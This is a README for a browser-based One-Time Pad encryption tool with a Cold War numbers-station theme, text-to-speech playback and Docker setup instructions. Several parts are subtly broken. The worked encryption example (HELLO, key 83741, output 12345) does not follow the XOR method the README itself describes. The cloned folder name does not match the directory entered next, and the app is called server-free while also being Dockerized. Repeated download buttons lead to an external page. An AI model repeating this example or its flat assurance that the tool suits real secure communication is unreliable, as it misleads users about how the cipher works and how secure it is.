# theNumberStation - Cryptography 2026

> A browser-based cryptography utility built around the One-Time Pad method associated with Cold War numbers stations, delivering information-theoretic security with a distinctive British TTS broadcast style and automatic session cleanup.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethan-fisher1997/thenumberstation-amber-ui?style=flat-square)](https://github.com/ethan-fisher1997/thenumberstation-amber-ui)

---

<p align="center">
  <a href="https://ethan-fisher1997.github.io/thenumberstation-amber-ui/">
    <img src="https://img.shields.io/badge/Download-theNumberStation%20Latest-brightgreen?style=for-the-badge" alt="Download theNumberStation">
  </a>
</p>

> **[Direct Download - theNumberStation v1.0](https://ethan-fisher1997.github.io/thenumberstation-amber-ui/)**

---

[Download Latest Build](https://ethan-fisher1997.github.io/thenumberstation-amber-ui/)

---

## What is theNumberStation?

theNumberStation recreates the atmosphere of a Cold War numbers station while providing a modern web tool for encryption and decryption. Drawing inspiration from the familiar "Call of Duty Black Ops" number sequences, it uses the One-Time Pad cipher to encode and recover messages. It is aimed at cryptography fans, history enthusiasts, and anyone interested in the overlap between espionage and mathematics.

The project stands out through its emphasis on both presentation and data handling. Its interface echoes a traditional station broadcast, and a British text-to-speech voice can read the encrypted numeric sequences aloud. After a session ends, the application clears its data automatically so nothing remains behind. Because it ships in a Dockerized setup, deployment stays predictable and simple across environments.

## Capabilities

- **Information-Theoretic Security** - Uses the One-Time Pad cipher, which is considered provably unbreakable when applied with truly random keys and used correctly
- **British TTS Integration** - Plays encrypted number strings with British speech synthesis to match the numbers station theme
- **Protocol Pointer System** - Follows a structured protocol that leads users from entering a message through secure transmission
- **Amber-P3 UI** - Amber monochrome styling modeled after retro Cold War cryptographic displays
- **Automatic Data Purge** - Cleans plaintext, keys, and other session data after each encryption or decryption run
- **Dockerized Infrastructure** - Container-based deployment designed for consistent behavior on Windows, macOS, and Linux

## Installation

Clone the repository and start the app with Docker:

```bash
git clone https://github.com/ethan-fisher1997/thenumberstation-amber-ui.git
cd theNumberStation-cipher
docker-compose up -d
```

If you prefer, you can also open `index.html` directly in a browser for a local setup without containers. The app is fully client-side and does not require a server.

## How to Use

1. **Enter Your Text** - Type the plaintext you want to encrypt, or paste the ciphertext you want to decrypt
2. **Create a One-Time Pad** - The tool generates a random key that matches the length of your message
3. **Run Encrypt or Decrypt** - XOR is applied between the message and the key to produce the result
4. **Broadcast with TTS** - Use the broadcast button so the British voice can read the encrypted numbers aloud
5. **Auto-Purge** - Ending the session triggers automatic removal of sensitive data

Example workflow for encrypting a short message:

```
Input: HELLO
Key:    83741
Output: 12345
```

A recipient with the same key can reverse the operation and restore the original message.

## Settings

Configuration lives in a local `config.js` file, where you can tune:

- TTS voice speed and pitch
- Default cipher mode (encrypt/decrypt)
- UI color scheme options
- Auto-purge timeout duration

For Docker-based installs, variables defined in `docker-compose.yml` take precedence over the config file.

## Requirements

- Modern web browser (Chrome, Firefox, Edge, or Safari -- latest version)
- Docker Engine 20.10+ (optional, for containerized deployment)
- JavaScript enabled in browser
- No server-side dependencies or database requirements
- Minimum 256MB RAM recommended for smooth TTS operation

## FAQ

**How does this compare to standard encryption tools?**  
theNumberStation centers on the One-Time Pad cipher, which offers information-theoretic security. In practical terms, it cannot be defeated by brute force or unlimited computing power as long as the key stays secret and is never reused.

**Is it suitable for real secure communication?**  
Yes, provided the One-Time Pad key is exchanged over a separate secure channel. The app performs encryption and decryption, but key sharing is still up to you.

**Why is everything deleted automatically?**  
The auto-purge behavior helps keep plaintext and keys out of disk storage and browser storage, which lowers the chance of accidental exposure.

**How do I move to the latest release?**  
Fetch the newest repository changes and rebuild the Docker container: `git pull && docker-compose up -d --build`

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
